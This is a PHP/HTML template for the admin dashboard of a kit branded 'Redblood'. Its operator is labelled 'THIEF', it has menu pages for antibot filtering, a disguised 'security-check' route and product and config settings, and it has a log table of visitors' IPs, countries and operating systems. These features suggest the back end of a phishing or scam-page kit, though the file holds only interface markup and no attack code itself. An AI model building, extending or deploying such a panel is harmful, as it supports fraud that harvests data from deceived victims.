<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>Admin Panel | Redblood</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/img/favicon.ico" rel="icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="stylesheet" href="<?= base_url() ?>REDBLOOD/Assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css">

    <!-- Libraries Stylesheet -->
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />
 
    <!-- Customized Bootstrap Stylesheet -->
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/fxc.css" rel="stylesheet">
</head>

<body>
    <div class="container-fluid position-relative d-flex p-0">
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <div class="sidebar pe-4 pb-3">
            <nav class="navbar bg-secondary navbar-dark">
                <a href="#" class="navbar-brand mx-4 mb-3">
                    <h3 class="text-primary"><img class="me-2" src="https://i.ibb.co/S70LBhQ/RBred.png" alt="" width="75"><span style="font-size:20px; font-family:calibri; letter-spacing: 2px; color: rgb(219, 219, 219);">REDBLOOD</span></h3>
                </a>
                <div class="d-flex align-items-center ms-4 mb-4">
                    <div class="position-relative">
                        <img class="rounded-circle" src="<?= base_url() ?>REDBLOOD/Views/panel/img/clay.jpg" alt="" style="width: 40px; height: 40px;">
                        <div class="bg-success rounded-circle border border-2 border-white position-absolute end-0 bottom-0 p-1"></div>
                    </div>
                    <div class="ms-3">
                        <h6 class="mb-0" style="text-transform: uppercase; color: rgb(198, 199, 201); font-size:12px; letter-spacing: 3px;">THIEF</h6>
                    </div>
                </div>
            <div class="navbar-nav w-100">
        <a href="<?= base_url() ?>security-check/panel" class="nav-item nav-link active">
            <i class="fa fa-tachometer-alt me-2"></i> Dashboard</a><br>
        <a href="<?= base_url() ?>?<?php echo _config('PARAMETER'); ?>" target="_blank" class="nav-item nav-link text-white" rel="noopener noreferrer">
            <i class="fa fa-globe me-2"></i>Check Site</a>
        <a href="<?= base_url() ?>security-check/panel/antibot" class="nav-item nav-link text-white"><i class="fa fa-bug me-2"></i>Antibot</a>
        <a href="<?= base_url() ?>security-check/panel/static"  class="nav-item nav-link text-white"><i class="fa fa-file me-2"></i>Static</a>
        <a href="<?= base_url() ?>security-check/panel/product" class="nav-item nav-link text-white"><i class="fa fa-shopping-cart me-2"></i>Product</a>
        <a href="<?= base_url() ?>security-check/panel/settings" class="nav-item nav-link text-white"><i class="fa fa-star me-2"></i>Configs</a>
         <a href="<?= base_url() ?>security-check/panel/logout" type="button" class="btn btn-primary m-2"><i class="fa fa-power-off me-2"></i>Logout</a>
                    </li>
                    </div>
                </div>
            </nav>
        </div>
        <div class="content">
            <nav class="navbar navbar-expand bg-secondary navbar-dark sticky-top px-4 py-0">
                <a href="index.html" class="navbar-brand d-flex d-lg-none me-4">
                    <h2 class="text-primary mb-0"><i class="t"></i>RB</h2>
                </a>
                <a href="#" class="sidebar-toggler flex-shrink-0">
                    <i class="fa fa-bars"></i>
                </a>
                <div class="navbar-nav align-items-center ms-auto">
                    <div class="nav-item dropdown">
                        <div class="dropdown-menu dropdown-menu-end bg-secondary border-0 rounded-0 rounded-bottom m-0">                  
                            <hr class="dropdown-divider">           
                            <hr class="dropdown-divider">      
                            <hr class="dropdown-divider">
                            <a href="#" class="dropdown-item text-center">See all</a>
                        </div>
                    </div>
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <img class="rounded-circle me-lg-2" src="<?= base_url() ?>REDBLOOD/Views/panel/img/clay.jpg" alt="" style="width: 40px; height: 40px;">
                            <span class="d-none d-lg-inline-flex">THIEF</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-secondary border-0 rounded-0 rounded-bottom m-0">
                            <a href="<?= base_url() ?>security-check/panel/logout" class="dropdown-item"><i class="fa fa-power-off me-2"></i>Log Out</a>
                        </div>
                    </div>
                </div>
            </nav>
            <div class="container-fluid pt-4 px-4">
                <div class="bg-secondary text-center rounded p-4">
                    <div class="d-flex align-items-center justify-content-between mb-4">
                        <h6 class="mb-0"><i class="fa fa-list m-1"></i> DATA</h6>
                        <button class="btn btn-danger" name="gasreset"><i class="fa fa-trash m-1"></i> CLEAR LOG</button>
                    </div>
                    <div class="card">
                        <div class="row g-4">
                            <div class="table">
                                <table class="table mt-3" style="background-color:grey;">
                                 <thead>
                                    <tr>
                                        <th class="text-dark" scope="col">FLAG</th>
                                        <th class="text-dark" scope="col">IP</th>
                                        <th class="text-dark" scope="col">COUNTRY</th>
                                        <th class="text-dark" scope="col">OS</th>
                                        <th class="text-dark" scope="col">INFO</th>
                                        <th class="text-dark" scope="col">TIME</th>
                                    </tr>
                                </thead>
                                <tbody>
                                </tbody>
                                </table>
                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="container-fluid pt-4 px-4">
                <div class="bg-secondary rounded-top p-4">
                    <div class="row">
                        <div class="col-12 col-sm-6 text-center text-sm-start">
                            &copy; <a href="#">2024 Redblood </a> All Right Reserved. 
                        </div>
                        <div class="col-12 col-sm-6 text-center text-sm-end">
                            Made with <i class="fa fa-heart text-primary"></i> by <a href="#">Redblood</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>    
<script src="<?= base_url() ?>REDBLOOD/Assets/js/core/jquery.3.2.1.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/core/popper.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/core/bootstrap.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chartist/chartist.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chartist/plugin/chartist-plugin-tooltip.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-mapael/maps/world_countries.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chart-circle/circles.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-scrollbar/jquery.scrollbar.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/ready.min.js"></script>
<script src="<?= base_url() ?>REDBLOOD/Assets/js/demo.js"></script>

</html>